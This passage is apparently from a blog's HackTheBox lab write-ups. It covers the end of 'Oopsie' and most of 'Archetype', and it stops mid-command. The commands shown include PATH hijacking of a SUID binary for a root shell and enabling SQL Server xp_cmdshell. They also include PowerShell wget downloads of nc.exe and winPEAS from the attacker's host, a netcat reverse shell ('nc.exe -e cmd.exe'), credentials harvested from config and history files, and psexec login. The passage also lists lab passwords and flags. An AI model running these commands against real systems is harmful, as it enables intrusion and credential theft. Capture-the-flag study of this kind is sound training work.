class="hljs-literal">-cgi</span>www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span><span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>loginwww<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> login<span class="hljs-built_in">cd</span> loginwww<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> <span class="hljs-built_in">ls</span><span class="hljs-built_in">ls</span>admin.php  db.php  index.php  script.jswww<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> db.php<span class="hljs-built_in">cat</span> db.php&lt;?php<span class="hljs-variable">$conn</span> = mysqli_connect(<span class="hljs-string">&#x27;localhost&#x27;</span>,<span class="hljs-string">&#x27;robert&#x27;</span>,<span class="hljs-string">&#x27;M3g4C0rpUs3r!&#x27;</span>,<span class="hljs-string">&#x27;garage&#x27;</span>);?&gt;www<span class="hljs-literal">-data</span>@oopsie:/var/www/html/cdn<span class="hljs-literal">-cgi</span>/login<span class="hljs-variable">$</span> </code></pre><p>Found password : <code>M3g4C0rpUs3r!</code></p><p> What is the file that contains the password that is shared with the robert user? </p><ul><li>db.php</li></ul><p> What executible is run with the option “-group bugtracker” to identify all files owned by the bugtracker group? </p><p><img src="/../oopsie_img/15.png" alt="alt text"></p><pre><code class="hljs powershell">robert@oopsie:/home<span class="hljs-variable">$</span> find / <span class="hljs-literal">-group</span> bugtracker <span class="hljs-number">2</span>&gt;/dev/nullfind / <span class="hljs-literal">-group</span> bugtracker <span class="hljs-number">2</span>&gt;/dev/null/usr/bin/bugtracker</code></pre><ul><li>find</li></ul><p> Regardless of which user starts running the bugtracker executable, what’s user privileges will use to run? </p><ul><li>root</li></ul><p>What SUID stands for ?</p><ul><li>Set owner User ID</li></ul><p> What is the name of the executable being called in an insecure manner? </p><ul><li>cat</li></ul><p><img src="/../oopsie_img/16.png" alt="alt text"></p><p>We get an error from the cat command, essentially, the bugtracker is functioning as a front-end for the <strong><code>cat</code></strong> command, fetching files from the <strong><code>/root/reports/</code></strong> directory and adding the bug ID to access them.</p><p>We’ll create a new cat file that will spawn a shell when it is ran:</p><pre><code class="hljs powershell">robert@oopsie:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/sh&quot;</span> &gt; <span class="hljs-built_in">cat</span>robert@oopsie:/tmp<span class="hljs-variable">$</span> chmod +x <span class="hljs-built_in">cat</span>chmod +x <span class="hljs-built_in">cat</span>robert@oopsie:/tmp<span class="hljs-variable">$</span> export PATH=/tmp:<span class="hljs-variable">$PATH</span>export PATH=/tmp:<span class="hljs-variable">$PATH</span>robert@oopsie:/tmp<span class="hljs-variable">$</span> <span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span><span class="hljs-built_in">echo</span> <span class="hljs-variable">$PATH</span>/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/gamesrobert@oopsie:/tmp<span class="hljs-variable">$</span> </code></pre><p>Run bugtracker:</p><pre><code class="hljs powershell">robert@oopsie:/tmp<span class="hljs-variable">$</span> bugtrackerbugtracker<span class="hljs-literal">------------------</span>: EV Bug Tracker :<span class="hljs-literal">------------------</span>Provide Bug ID: <span class="hljs-number">3</span><span class="hljs-number">3</span><span class="hljs-literal">---------------</span><span class="hljs-comment"># whoami</span>whoamiroot<span class="hljs-comment"># </span></code></pre><p><img src="/../oopsie_img/17.png" alt="alt text"></p><p>Root Flag: <code>af13b0bee69f8a877c3faf667f7beacf</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> HackTheBox </tag>
            
            <tag> Very Easy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Archetype</title>
      <link href="/2024/05/24/Archetype/"/>
      <url>/2024/05/24/Archetype/</url>
      
        <content type="html"><![CDATA[<p><img src="/../archetype_img/archetype.png" alt="alt text"></p><p>Machine IP: 10.129.95.187</p><h1 id="Information-Gathering"><a href="#Information-Gathering" class="headerlink" title="Information Gathering"></a>Information Gathering</h1><h2 id="NMAP-Scanning"><a href="#NMAP-Scanning" class="headerlink" title="NMAP Scanning :"></a>NMAP Scanning :</h2><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>]└─<span class="hljs-variable">$</span> sudo nmap <span class="hljs-literal">-p-</span> <span class="hljs-literal">-sS</span> <span class="hljs-literal">--min-rate</span> <span class="hljs-number">5000</span> <span class="hljs-literal">--open</span> <span class="hljs-literal">-T5</span> <span class="hljs-literal">-vvv</span> <span class="hljs-literal">-Pn</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> [<span class="hljs-type">sudo</span>] password <span class="hljs-keyword">for</span> kali: Host discovery disabled (<span class="hljs-literal">-Pn</span>). All addresses will be marked <span class="hljs-string">&#x27;up&#x27;</span> and scan times may be slower.Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">20</span>:<span class="hljs-number">55</span> EDTInitiating Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">20</span>:<span class="hljs-number">55</span>Completed Parallel DNS resolution of <span class="hljs-number">1</span> host. at <span class="hljs-number">20</span>:<span class="hljs-number">55</span>, <span class="hljs-number">0.10</span>s elapsedDNS resolution of <span class="hljs-number">1</span> IPs took <span class="hljs-number">0.10</span>s. Mode: Async [<span class="hljs-comment">#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]</span><span class="hljs-type">Initiating</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">20</span>:<span class="hljs-number">55</span><span class="hljs-type">Scanning</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span> [<span class="hljs-number">65535</span> <span class="hljs-type">ports</span>]<span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">139</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">135</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">445</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">5985</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">47001</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49669</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49668</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">1433</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49666</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49665</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Discovered</span> <span class="hljs-type">open</span> <span class="hljs-type">port</span> <span class="hljs-number">49667</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">on</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Completed</span> <span class="hljs-type">SYN</span> <span class="hljs-type">Stealth</span> <span class="hljs-type">Scan</span> <span class="hljs-type">at</span> <span class="hljs-number">20</span>:<span class="hljs-number">56</span>, <span class="hljs-number">22.51</span><span class="hljs-type">s</span> <span class="hljs-type">elapsed</span> (<span class="hljs-number">65535</span> <span class="hljs-type">total</span> <span class="hljs-type">ports</span>)<span class="hljs-type">Nmap</span> <span class="hljs-type">scan</span> <span class="hljs-type">report</span> <span class="hljs-type">for</span> <span class="hljs-number">10.129</span><span class="hljs-type">.95.187</span><span class="hljs-type">Host</span> <span class="hljs-type">is</span> <span class="hljs-type">up</span>, <span class="hljs-type">received</span> <span class="hljs-type">user</span>-<span class="hljs-type">set</span> (<span class="hljs-number">0.087</span><span class="hljs-type">s</span> <span class="hljs-type">latency</span>)<span class="hljs-type">.</span><span class="hljs-type">Scanned</span> <span class="hljs-type">at</span> <span class="hljs-number">2024</span>-<span class="hljs-number">05</span>-<span class="hljs-number">20</span> <span class="hljs-number">20</span>:<span class="hljs-number">55</span>:<span class="hljs-number">41</span> <span class="hljs-type">EDT</span> <span class="hljs-type">for</span> <span class="hljs-number">22</span><span class="hljs-type">s</span><span class="hljs-type">Not</span> <span class="hljs-type">shown</span>: <span class="hljs-number">62292</span> <span class="hljs-type">closed</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">reset</span>), <span class="hljs-number">3232</span> <span class="hljs-type">filtered</span> <span class="hljs-type">tcp</span> <span class="hljs-type">ports</span> (<span class="hljs-type">no</span>-<span class="hljs-type">response</span>)<span class="hljs-type">Some</span> <span class="hljs-type">closed</span> <span class="hljs-type">ports</span> <span class="hljs-type">may</span> <span class="hljs-type">be</span> <span class="hljs-type">reported</span> <span class="hljs-type">as</span> <span class="hljs-type">filtered</span> <span class="hljs-type">due</span> <span class="hljs-type">to</span> --<span class="hljs-type">defeat</span>-<span class="hljs-type">rst</span>-<span class="hljs-type">ratelimit</span><span class="hljs-type">PORT</span>      <span class="hljs-type">STATE</span> <span class="hljs-type">SERVICE</span>      <span class="hljs-type">REASON</span><span class="hljs-number">135</span>/<span class="hljs-type">tcp</span>   <span class="hljs-type">open</span>  <span class="hljs-type">msrpc</span>        <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">139</span>/<span class="hljs-type">tcp</span>   <span class="hljs-type">open</span>  <span class="hljs-type">netbios</span>-<span class="hljs-type">ssn</span>  <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">445</span>/<span class="hljs-type">tcp</span>   <span class="hljs-type">open</span>  <span class="hljs-type">microsoft</span>-<span class="hljs-type">ds</span> <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">1433</span>/<span class="hljs-type">tcp</span>  <span class="hljs-type">open</span>  <span class="hljs-type">ms</span>-<span class="hljs-type">sql</span>-<span class="hljs-type">s</span>     <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">5985</span>/<span class="hljs-type">tcp</span>  <span class="hljs-type">open</span>  <span class="hljs-type">wsman</span>        <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">47001</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">winrm</span>        <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49665</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49666</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49667</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49668</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-number">49669</span>/<span class="hljs-type">tcp</span> <span class="hljs-type">open</span>  <span class="hljs-type">unknown</span>      <span class="hljs-type">syn</span>-<span class="hljs-type">ack</span> <span class="hljs-type">ttl</span> <span class="hljs-number">127</span><span class="hljs-type">Read</span> <span class="hljs-type">data</span> <span class="hljs-type">files</span> <span class="hljs-type">from</span>: /<span class="hljs-type">usr</span>/<span class="hljs-type">bin</span>/<span class="hljs-type">..</span>/<span class="hljs-type">share</span>/<span class="hljs-type">nmap</span><span class="hljs-type">Nmap</span> <span class="hljs-type">done</span>: <span class="hljs-number">1</span> <span class="hljs-type">IP</span> <span class="hljs-type">address</span> (<span class="hljs-number">1</span> <span class="hljs-type">host</span> <span class="hljs-type">up</span>) <span class="hljs-type">scanned</span> <span class="hljs-type">in</span> <span class="hljs-number">22.73</span> <span class="hljs-type">seconds</span>           <span class="hljs-type">Raw</span> <span class="hljs-type">packets</span> <span class="hljs-type">sent</span>: <span class="hljs-number">107020</span> (<span class="hljs-number">4.709</span><span class="hljs-type">MB</span>) | <span class="hljs-type">Rcvd</span>: <span class="hljs-number">88091</span> (<span class="hljs-number">3.524</span><span class="hljs-type">MB</span>)</code></pre><p>FULL NMAP Scanning: (scanning the ports we got)</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> nmap <span class="hljs-literal">-A</span> <span class="hljs-literal">-sC</span> <span class="hljs-literal">-sV</span> <span class="hljs-literal">-p139</span>,<span class="hljs-number">135</span>,<span class="hljs-number">445</span>,<span class="hljs-number">5985</span>,<span class="hljs-number">47001</span>,<span class="hljs-number">49669</span>,<span class="hljs-number">49668</span>,<span class="hljs-number">1433</span>,<span class="hljs-number">49666</span>,<span class="hljs-number">49665</span>,<span class="hljs-number">49667</span>  <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> <span class="hljs-literal">-Pn</span>Starting Nmap <span class="hljs-number">7.94</span>SVN ( https://nmap.org ) at <span class="hljs-number">2024</span><span class="hljs-literal">-05-20</span> <span class="hljs-number">20</span>:<span class="hljs-number">57</span> EDTNmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>Host is up (<span class="hljs-number">0.080</span>s latency).PORT      STATE SERVICE      VERSION<span class="hljs-number">135</span>/tcp   open  msrpc        Microsoft Windows RPC<span class="hljs-number">139</span>/tcp   open  netbios<span class="hljs-literal">-ssn</span>  Microsoft Windows netbios<span class="hljs-literal">-ssn</span><span class="hljs-number">445</span>/tcp   open  microsoft<span class="hljs-literal">-ds</span> Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> microsoft<span class="hljs-literal">-ds</span><span class="hljs-number">1433</span>/tcp  open  ms<span class="hljs-literal">-sql-s</span>     Microsoft SQL Server <span class="hljs-number">2017</span> <span class="hljs-number">14.00</span>.<span class="hljs-number">1000.00</span>; RTM| ms<span class="hljs-literal">-sql-info</span>: |   <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>:<span class="hljs-number">1433</span>: |     Version: |       name: Microsoft SQL Server <span class="hljs-number">2017</span> RTM|       number: <span class="hljs-number">14.00</span>.<span class="hljs-number">1000.00</span>|       Product: Microsoft SQL Server <span class="hljs-number">2017</span>|       Service pack level: RTM|       Post<span class="hljs-literal">-SP</span> patches applied: false|_    TCP port: <span class="hljs-number">1433</span>| ms<span class="hljs-literal">-sql-ntlm-info</span>: |   <span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>:<span class="hljs-number">1433</span>: |     Target_Name: ARCHETYPE|     NetBIOS_Domain_Name: ARCHETYPE|     NetBIOS_Computer_Name: ARCHETYPE|     DNS_Domain_Name: Archetype|     DNS_Computer_Name: Archetype|_    Product_Version: <span class="hljs-number">10.0</span>.<span class="hljs-number">17763</span>| ssl<span class="hljs-literal">-cert</span>: Subject: commonName=SSL_Self_Signed_Fallback| Not valid before: <span class="hljs-number">2024</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">48</span>:<span class="hljs-number">02</span>|_Not valid after:  <span class="hljs-number">2054</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">48</span>:<span class="hljs-number">02</span>|_ssl<span class="hljs-literal">-date</span>: <span class="hljs-number">2024</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">59</span>:<span class="hljs-number">08</span>+<span class="hljs-number">00</span>:<span class="hljs-number">00</span>; <span class="hljs-number">0</span>s from scanner time.<span class="hljs-number">5985</span>/tcp  open  http         Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)|_http<span class="hljs-literal">-server-header</span>: Microsoft<span class="hljs-literal">-HTTPAPI</span>/<span class="hljs-number">2.0</span>|_http<span class="hljs-literal">-title</span>: Not Found<span class="hljs-number">47001</span>/tcp open  http         Microsoft HTTPAPI httpd <span class="hljs-number">2.0</span> (SSDP/UPnP)|_http<span class="hljs-literal">-server-header</span>: Microsoft<span class="hljs-literal">-HTTPAPI</span>/<span class="hljs-number">2.0</span>|_http<span class="hljs-literal">-title</span>: Not Found<span class="hljs-number">49665</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49666</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49667</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49668</span>/tcp open  msrpc        Microsoft Windows RPC<span class="hljs-number">49669</span>/tcp open  msrpc        Microsoft Windows RPCService Info: OSs: Windows, Windows Server <span class="hljs-number">2008</span> R2 - <span class="hljs-number">2012</span>; CPE: cpe:/o:microsoft:windowsHost script results:| smb<span class="hljs-literal">-os-discovery</span>: |   OS: Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">17763</span> (Windows Server <span class="hljs-number">2019</span> Standard <span class="hljs-number">6.3</span>)|   Computer name: Archetype|   NetBIOS computer name: ARCHETYPE\x00|   Workgroup: WORKGROUP\x00|_  System time: <span class="hljs-number">2024</span><span class="hljs-literal">-05-20T17</span>:<span class="hljs-number">58</span>:<span class="hljs-number">56</span><span class="hljs-literal">-07</span>:<span class="hljs-number">00</span>| smb2<span class="hljs-literal">-time</span>: |   date: <span class="hljs-number">2024</span><span class="hljs-literal">-05-21T00</span>:<span class="hljs-number">58</span>:<span class="hljs-number">58</span>|_  start_date: N/A| smb<span class="hljs-literal">-security-mode</span>: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2<span class="hljs-literal">-security-mode</span>: |   <span class="hljs-number">3</span>:<span class="hljs-number">1</span>:<span class="hljs-number">1</span>: |_    Message signing enabled but not required|_c<span class="hljs-built_in">lock-skew</span>: mean: <span class="hljs-number">1</span>h24m00s, deviation: <span class="hljs-number">3</span>h07m51s, median: <span class="hljs-number">0</span>sService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">71.19</span> seconds</code></pre><p> Which TCP port is hosting a database server? </p><ul><li>1433</li></ul><p> What is the name of the non-Administrative share available over SMB? </p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> smbclient <span class="hljs-literal">-L</span> //<span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> <span class="hljs-literal">-N</span></code></pre><p><img src="/../archetype_img/1.png" alt="alt text"></p><ul><li>backups</li></ul><p> What is the password identified in the file on the SMB share? </p><p>Log in with smbclient:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~]└─<span class="hljs-variable">$</span> smbclient //<span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span>/backups <span class="hljs-literal">-N</span> <span class="hljs-literal">-m</span> SMB2</code></pre><p><img src="/../archetype_img/2.png" alt="alt text"></p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Downloads</span>]└─<span class="hljs-variable">$</span> <span class="hljs-built_in">cat</span> prod.dtsConfig &lt;DTSConfiguration&gt;    &lt;DTSConfigurationHeading&gt;        &lt;DTSConfigurationFileInfo GeneratedBy=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageName=<span class="hljs-string">&quot;...&quot;</span> GeneratedFromPackageID=<span class="hljs-string">&quot;...&quot;</span> GeneratedDate=<span class="hljs-string">&quot;20.1.2019 10:01:34&quot;</span>/&gt;    &lt;/DTSConfigurationHeading&gt;    &lt;Configuration ConfiguredType=<span class="hljs-string">&quot;Property&quot;</span> Path=<span class="hljs-string">&quot;\Package.Connections[Destination].Properties[ConnectionString]&quot;</span> ValueType=<span class="hljs-string">&quot;String&quot;</span>&gt;        &lt;ConfiguredValue&gt;<span class="hljs-keyword">Data</span> Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.<span class="hljs-number">1</span>;Persist Security Info=True;Auto Translate=False;&lt;/ConfiguredValue&gt;    &lt;/Configuration&gt;&lt;/DTSConfiguration&gt;</code></pre><p>Password: M3g4c0rp123</p><p>User : Archetype&#x2F;sql_svc</p><p>Answer:</p><ul><li>M3g4c0rp123</li></ul><p> What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? </p><p><img src="/../archetype_img/3.png" alt="alt text"></p><ul><li>mssqlclient.py</li></ul><p> What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? </p><p><img src="/../archetype_img/4.png" alt="alt text"></p><ul><li>xp_cmdshell</li></ul><p> What script can be used in order to search possible paths to escalate privileges on Windows hosts? </p><ul><li>winpeas (linpeas for windows)</li></ul><p>Download this tool and install the requirements:</p><p><a href="https://github.com/fortra/impacket">https://github.com/fortra/impacket</a></p><pre><code class="hljs powershell">git clone https://github.com/fortra/impacket<span class="hljs-built_in">cd</span> impacketpip3 install <span class="hljs-literal">-r</span> requirements.txtpython3 setup.py install</code></pre><p>Use <code>mssqlclient</code> to authenticate:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">impacket</span>]└─<span class="hljs-variable">$</span> python3 examples/mssqlclient.py Archetype/sql_svc@<span class="hljs-number">10.129</span>.<span class="hljs-number">95.187</span> <span class="hljs-literal">-windows-auth</span></code></pre><p><img src="/../archetype_img/5.png" alt="alt text"></p><p>First let’s check our roles on the server:</p><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> is_srvrolemember(<span class="hljs-string">&#x27;sysadmin&#x27;</span>);</code></pre><p><img src="/../archetype_img/6.png" alt="alt text"></p><p>Return’s 1 which means that is true.</p><p><strong>Step 1: Enable <code>xp_cmdshell</code></strong></p><p><strong>Enable Advanced Options:</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;show advanced options&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;</code></pre><p><strong>Enable <code>xp_cmdshell</code>:</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;RECONFIGURE;</code></pre><p><img src="/../archetype_img/7.png" alt="alt text"></p><p><strong>Step 2: Execute Commands Using <code>xp_cmdshell</code></strong></p><p>Now that <strong><code>xp_cmdshell</code></strong> is enabled, you can execute commands. Here are a few examples:</p><p><strong>Listing Directory Contents:</strong></p><pre><code class="hljs sql"><span class="hljs-keyword">EXEC</span> xp_cmdshell <span class="hljs-string">&#x27;dir C:\&#x27;</span>;</code></pre><pre><code class="hljs powershell">SQL (ARCHETYPE\sql_svc  dbo@master)&gt; EXEC xp_cmdshell <span class="hljs-string">&#x27;dir C:\&#x27;</span>;</code></pre><p><img src="/../archetype_img/8.png" alt="alt text"></p><p>Good, so we have a shell now but let’s try to get our own stable shell</p><p><a href="https://pentesting.academy/p/how-to-get-a-xp-cmdshell-reverse-shell-in-a-windows-server-a9696041a785">https://pentesting.academy/p/how-to-get-a-xp-cmdshell-reverse-shell-in-a-windows-server-a9696041a785</a></p><h2 id="xp-cmdshell-with-nc"><a href="#xp-cmdshell-with-nc" class="headerlink" title="xp_cmdshell with nc"></a>xp_cmdshell with nc</h2><p>First we have to download nc.exe :<a href="https://github.com/int0x33/nc.exe/blob/master/nc.exe">https://github.com/int0x33/nc.exe/blob/master/nc.exe</a> </p><p>on our local machine</p><p>Set up a python server on our own machine in order to send the file to the attacked machine</p><pre><code class="hljs powershell">python3 <span class="hljs-literal">-m</span> http.server</code></pre><p>And run this command in the shell we have:</p><pre><code class="hljs powershell">xp_cmdshell <span class="hljs-string">&quot;powershell.exe wget http://10.10.14.211:8000/nc.exe -OutFile c:\\Users\Public\\nc.exe&quot;</span></code></pre><p><img src="/../archetype_img/9.png" alt="alt text"></p><p>We can see the file has been uploaded succesfully :</p><p><img src="/../archetype_img/10.png" alt="alt text"></p><p>Set up a netcat listener on our machine :</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/…/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>/<span class="hljs-type">nc.exe</span>]└─<span class="hljs-variable">$</span> nc <span class="hljs-literal">-lvnp</span> <span class="hljs-number">4444</span></code></pre><p>And run this where we have shell access:</p><pre><code class="hljs powershell">xp_cmdshell <span class="hljs-string">&quot;c:\\Users\Public\\nc.exe -e cmd.exe 10.10.14.211 4444&quot;</span></code></pre><p>Aaaaand ladies and gentleman’s</p><ul><li><p>We have our own stable shell now</p><p>  <img src="/../archetype_img/11.png" alt="alt text"></p></li></ul><pre><code class="hljs powershell"><span class="hljs-built_in">cd</span> Users<span class="hljs-built_in">cd</span> sql_svc<span class="hljs-built_in">cd</span> Desktop<span class="hljs-built_in">type</span> user.txt</code></pre><p><img src="/../archetype_img/12.png" alt="alt text"></p><p>User Password: <code>3e7b102e78218e935bf3f4951fec21a3</code></p><h1 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h1><p>Download WinPeas to our machine and open a http.server:</p><pre><code class="hljs powershell">python3 <span class="hljs-literal">-m</span> http.server</code></pre><p>Run this command on the active shell we got to copy the winPEASx64.exe:</p><pre><code class="hljs powershell">powershell.exe <span class="hljs-built_in">wget</span> http://<span class="hljs-number">10.10</span>.<span class="hljs-number">14.211</span>:<span class="hljs-number">8000</span>/winPEASx64.exe <span class="hljs-literal">-OutFile</span> c:\\Users\Public\\winPEASx64.exe</code></pre><p>And simply run by typing <code>winPEASx64.exe</code></p><p><img src="/../archetype_img/13.png" alt="alt text"></p><p><img src="/../archetype_img/14.png" alt="alt text"></p><p>Go into that file:</p><pre><code class="hljs powershell">C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine&gt;<span class="hljs-built_in">type</span> ConsoleHost_history.txt<span class="hljs-built_in">type</span> ConsoleHost_history.txtnet.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!<span class="hljs-keyword">exit</span></code></pre><p>user:administrator</p><p>pass:MEGACORP_4dm1n!!</p><p> What file contains the administrator’s password? </p><ul><li>Consolehost_history.txt</li></ul><p>Now we can use psexec to log in as administrator and get the flag:</p><pre><code class="hljs powershell">┌──(kali㉿kali)-[~/<span class="hljs-type">Desktop</span>/<span class="hljs-type">Workspace</span>/<span class="hljs-type">HTB</span>/<span class="hljs-type">starting</span>]└─<span class="hljs-variable">$</span> python3 /home/kali/Desktop/Workspace/HTB/starting/impacket/examples/psexec.py administrator@<span class="hljs-number">10.129</span>.<span class="hljs-number">5.68</span>  Impacket v0.<span class="hljs-number">12.0</span>.dev1+<span class="hljs-number">20240517.91610</span>.<span class="hljs-number">269</span>ce698 - Copyright <span class="hljs-number">2023</span> FortraPassword:[*] Requesting shares on <span 